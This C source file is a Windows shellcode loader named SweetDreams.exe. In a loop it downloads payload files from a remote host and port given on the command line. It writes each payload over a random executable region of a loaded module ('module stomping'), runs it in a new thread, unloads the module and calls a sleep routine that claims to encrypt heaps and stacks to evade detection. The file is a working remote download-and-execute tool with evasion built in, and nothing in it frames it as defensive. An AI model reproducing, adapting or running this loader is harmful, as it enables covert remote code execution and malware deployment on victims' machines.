#include "commun.h"




int main(int argc, char** argv) {

    if (argc != 4) {
        printf("\n\tUsage:\n\t\tSweetDreams.exe <host> <port> <moduleName>\n\n");
        return 1;
    }

    const char* host = argv[1];
    const char* port = argv[2];
    const char* moduleName = argv[3];

    printf("[+] PID : %d\n", GetCurrentProcessId());
    printf("[+] TID : %d\n", GetCurrentThreadId());

    unsigned char shellcode[] = "Malware would make a great politician; it promises speed and efficiency, but all it does is take up resources and cause problems!";
   
    // Create a heap
    HANDLE hHeap = HeapCreate(0, 0, 0);
    if (hHeap == NULL) {
        printf("HeapCreate failed (%d)\n", GetLastError());
        return 1;
    }

    // Allocate memory in the heap
    LPVOID lpMem = HeapAlloc(hHeap, 0, sizeof(shellcode)*2);
    if (lpMem == NULL) {
        printf("HeapAlloc failed (%d)\n", GetLastError());
        HeapDestroy(hHeap);
        return 1;
    }
    printf("[+] Heap Allocation @ %p\n\n", lpMem);

    // Copy the shellcode to the allocated memory
    CopyMemory(lpMem, shellcode, sizeof(shellcode));


    int i = 0;

    while (true) {

        const char* tasks[3] = {"task1.bin", "task2.bin", "task3.bin"};
        
        DATA task = getFilelessData(host, port, tasks[i]);
        i++;

        if (i == 3) i = 0;

        if (!task.data) {
            printf("[-] Failed in retrieving shellcode (%u)\n", GetLastError());
            return -1;
        }

        printf("[+] Shellcode retrieved %p sized %d bytes\n", task.data, task.len);

        LPVOID RXspot = getRandomRXspot(moduleName, task.len);

        if (RXspot != NULL) {
            DWORD oldprotect = 0;
            if (!VirtualProtect((char*)RXspot, task.len, PAGE_READWRITE, &oldprotect)) {
                printf("[-] Failed in VirtualProtect 1 (%u)\n", GetLastError());
                return -1;
            }

            RtlMoveMemory(RXspot, task.data, task.len);
            // Zero out the retrieved shellcode
            ZeroMemory(task.data, task.len);

            // restore previous memory protection settings
            if (!VirtualProtect((char*)RXspot, task.len, oldprotect, &oldprotect)) {
                printf("[-] Failed in VirtualProtect 2 (%u)\n", GetLastError());
                return -1;
            }

            printf("[+] Stomped region starting : %p\n", RXspot);


            // Replace that with a Threadless execution , WaitForSingleObject ....
            HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RXspot, NULL, 0, 0);

            printf("[+] Thread Executing Shellcode TID : %d\n\n", GetThreadId(hThread));

            if (!hThread) {
                printf("[-] Failed in CreateThread (%u)\n", GetLastError());
                return -1;
            }

            WaitForSingleObject(hThread, INFINITE);

            printf("[+] Reverting Stomped %s \n", moduleName);
            
            
            HMODULE hModule = GetModuleHandleA(moduleName);

            if (hModule == NULL) {
                printf("[-] Module is not loaded.\n");
                return -1;
            }

            if (FreeLibrary(hModule)) {
                printf("[+] Successfully unloaded the module.\n");

            }
            else {
                printf("[-] Failed to unload the module. Error code: %lu\n", GetLastError());
                return -1;
            }

            
            printf("[+] Encrypting Heaps/Stacks ...\n\n\n");
            HappySleep(moduleName);
            
            
        }
        else {
            printf("[-] Impossible to stomp that module\n\n");
        }
    }
	return 0;
}